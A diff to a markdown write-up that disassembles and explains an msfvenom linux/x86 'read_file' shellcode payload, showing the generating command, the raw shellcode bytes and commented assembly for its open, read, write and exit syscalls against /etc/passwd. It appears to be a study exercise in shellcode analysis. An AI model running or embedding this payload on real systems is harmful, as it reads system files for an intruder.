@@ -1,13 +1,16 @@
 # Analyze: Read File
 
 # Create shellcode
+
 ```bash
 msfvenom -p linux/x86/read_file -f c PATH=/etc/passwd
 ```
 
+The output is shellcode that will read the file /etc/passwd and print to STDOUT.
+
 # Analysis
 
-## Disassemble w/ bash
+## Disassemble
 ```bash
 echo -n "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00" | ndisasm -u -
 ```
@@ -52,6 +55,16 @@ The first command that is run jumps to the data section
 
 ```x86asm
 00000000  EB36              jmp short 0x38  ; jmp to jump1
+.
+.
+; <shellcode>
+.
+.
+jump1:
+00000038  E8C5FFFFFF        call 0x2    ; jump to main
+                                        ; address of 0x3D pushed to top of stack
+0000003D  2F6574632F706173737764        ; /etc/passwd
+00000048  00                db 0x00     ; NULL terminator
 ```
 
 It it will jump to `00000038` which calls back to the beginning of the shellcode. Importantly, this call places the address of the string "/etc/passwd" on the stack that would traditionally be used as a return address for a call, however, I will use it later to as the path of the file to read.
@@ -115,13 +128,16 @@ Now the `0x4` syscall is prepared. This corresponds to the [write()](https://man
 ssize_t write(int fd, const void *buf, size_t count);
 ```
 
+The first parameter is loaded into `ebx` and is a `1` as this is a reference to the STDOUT file descriptor on linux. 
 
+The second parameter is still `ecx` which is a pointer to the stack. 
 
+The final parameter `edx` was the return value from the read() command, and is the number of bytes to write. 
 
-00000020  B804000000        mov eax,0x4     ; cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep " 4$"
-                                            ; write()
-                                            ; man 2 write
-                                            ; ssize_t write(int fd, const void *buf, size_t count);
+This assembly is taking the data read from /etc/passwd, which is currently stored on the stack, and outputs it to STDOUT (the console):
+
+```x86asm
+00000020  B804000000        mov eax,0x4     ; write()
 00000025  BB01000000        mov ebx,0x1     ; 1 = stdout (where to write output)
 0000002A  CD80              int 0x80        ; call write() 
                                             ; NOTE: ecx still points to stack (buffer to write)
@@ -133,22 +149,11 @@ ssize_t write(int fd, const void *buf, size_t count);
                                             ; void exit(int status);
 00000031  BB00000000        mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
 00000036  CD80              int 0x80        ; call exit()
-
-
-
-jump1:
-00000038  E8C5FFFFFF        call 0x2    ; jump to main
-                                        ; address of 0x3D pushed to top of stack
-0000003D  2F6574632F706173737764        ; /etc/passwd
-00000048  00                db 0x00     ; NULL terminator
-
-
-
-
+```
 
 ## Disassembled (Cleaned and commented)
 
-Here I have cleaned and commented the code
+Here I have cleaned and commented the code in entirety.
 
 ```x86asm
 00000000  EB36              jmp short 0x38  ; jmp to jump1
